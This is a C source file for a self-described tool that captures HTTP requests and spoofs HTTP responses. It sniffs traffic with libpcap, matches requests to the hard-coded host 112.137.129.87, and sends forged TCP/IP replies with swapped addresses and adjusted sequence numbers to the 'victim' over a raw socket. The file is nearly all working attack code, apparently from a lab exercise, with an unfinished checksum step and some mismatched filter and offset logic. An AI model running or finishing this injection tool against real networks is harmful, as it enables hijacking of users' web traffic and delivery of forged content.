#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "decode-ethernet.h"
#include "decode-ipv4.h"
#include "decode-tcp.h"
#include "decode-udp.h"
#include "decode-icmpv4.h"
#include "decode-http.h"
#include "config.h"
#include "util-logger.h"

#define MAX_FILE_SIZE 2000

AttackConfig *config;

void send_raw_ip_packet(int sock, u_char *ip, int n, struct sockaddr_in dstInfo) {
	int r = sendto(sock , ip, n , 0 , (struct sockaddr *) &dstInfo, sizeof (dstInfo));
	if (r >=0) printf( " Sent a packet of size : %d\n ", r) ;
	else printf( "Failed to send packet.\n" ) ;
}

void spoof_reply_http(ipheader *ip) {
	int IP_HEADER_LEN = ip -> iph_ihl * 4;
	tcpheader *tcpReceive = (tcpheader *) ((u_char *)ip + IP_HEADER_LEN);

	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock , IPPROTO_IP , IP_HDRINCL , &enable, sizeof(enable));
	
	/* Read template of IP packet*/
	FILE *f = fopen( "ip.bin", "rb");
	if (!f) {
		perror( " Can't open 'ip.bin'");
		exit (0);
	}

	unsigned char ipData[MAX_FILE_SIZE];
	int n = fread (ipData , 1, MAX_FILE_SIZE, f);

	/* Swap src and dst info */
	unsigned short srcPort = tcpReceive->th_dport;			// Swap src and dst port
	unsigned int srcIp = (ip->iph_dstip).s_addr;	// Swap src and dst ip
	
	unsigned short dstPort = tcpReceive->th_sport;
	unsigned int dstIp = (ip->iph_srcip).s_addr;

	memcpy(ipData+12, &srcIp, 4);	// Change src ip
	memcpy(ipData+16, &dstIp, 4);	// Change dst ip

	memcpy(ipData+20, &srcPort, 2);	// Change src port
	memcpy(ipData+22, &dstPort, 2);	// Change dst port

	/* Re-calculate sequence number and ack number */
	ipheader *ipSend = (ipheader *)ipData;
	int IP_HEADER_SEND_LEN = ipSend -> iph_ihl * 4;
	tcpheader *tcpSend = (tcpheader *) ((u_char *)ipData + IP_HEADER_SEND_LEN);
	
	/* New sequence number = received ack number*/
	tcpSend ->  th_seq = tcpReceive -> th_ack;

	/* New ACK number= received sequence number + TCP payload length */
	char *payloadReceive = (char *) ((u_char *)ip + IP_HEADER_LEN + TCP_HEADER_LEN);
	uint32_t payloadLen = strlen(payloadReceive);
	tcpSend -> th_ack = htonl(ntohl(tcpReceive -> th_seq) + payloadLen); 


	/* Dst info to send by raw socket*/
	struct sockaddr_in dstInfo;
	dstInfo.sin_family = AF_INET;
	dstInfo.sin_addr.s_addr = (ip->iph_srcip).s_addr;
	dstInfo.sin_port = tcpReceive->th_sport;

	/* Re-calculate TCP checksum */
	// Do smt here

	/*send sproof IP packet to victim*/
	send_raw_ip_packet(sock, ipData , n, dstInfo);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	ethheader *eth = (ethheader *) packet;
	if (ntohs(eth-> ether_type) == 0x0800) {	// ip packet
		ipheader *ip = (ipheader *) ((u_char *)packet + ETHERNET_HEADER_LEN);
		int IP_HEADER_LEN = ip -> iph_ihl * 4;
		//int IP_HEADER_LEN  = 20;
		switch (ip->iph_proto) {

			case IPPROTO_TCP:	;// TCP protocol
				tcpheader *tcp = (tcpheader *) ((u_char *)packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				int TCP_HEADER_LEN2 =  tcp->th_offx2 / 8;
				//printf("headerlen: %d", TCP_HEADER_LEN2);
				u_char * data = (u_char *) ((u_char *)ip + ETHERNET_HEADER_LEN + IP_HEADER_LEN + TCP_HEADER_LEN2 + 2);
				char match = 0;
				if (ntohs(tcp->th_dport)==80 && data != NULL && strlen((char *) data) > 10) {
					httprequest *request = parseRequest(data);
					if (request != NULL) {
						//char *token = NULL;
						//token = strtok(request->host, ":");
						printf("host %s\n", request->host);
						if (!strncmp(request->host,"112.137.129.87",strlen(request->host))) match =1;
						if (match) {
							spoof_reply_http(ip);
						}

					} else printf("invalid HTTP!");
				}

				break;

			case IPPROTO_UDP: ;
				//udpheader *udp = (udpheader *) (packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				break;

			case IPPROTO_ICMP: ;
				//icmpheader *icmp = (icmpheader *) (packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
				break;

			default:
				break;
		}
	} 
}


int main(int argc, char const *argv[])
{
	pcap_t *handle;
	char errbuff[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] ="ip proto icmp";
	bpf_u_int32 net;
	printf("Kien's tool: A tool for capturing HTTP Request and sproofing HTTP respond\n");
	printf("Warning: This tool must run as root user\n");
	printf("Version 1.0\n");
	printf("================================================\n");
	config = parseConfig(argc, argv);
	if (config == NULL || config->interface == NULL) return 1;
	printf("Running in interface %s!\n", config->interface);
	handle = pcap_open_live(config->interface, BUFSIZ, 1, 100, errbuff);
	pcap_compile(handle, &fp, filter_exp, 0, net);
	pcap_setfilter(handle, &fp);
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle);
	return 0;
}





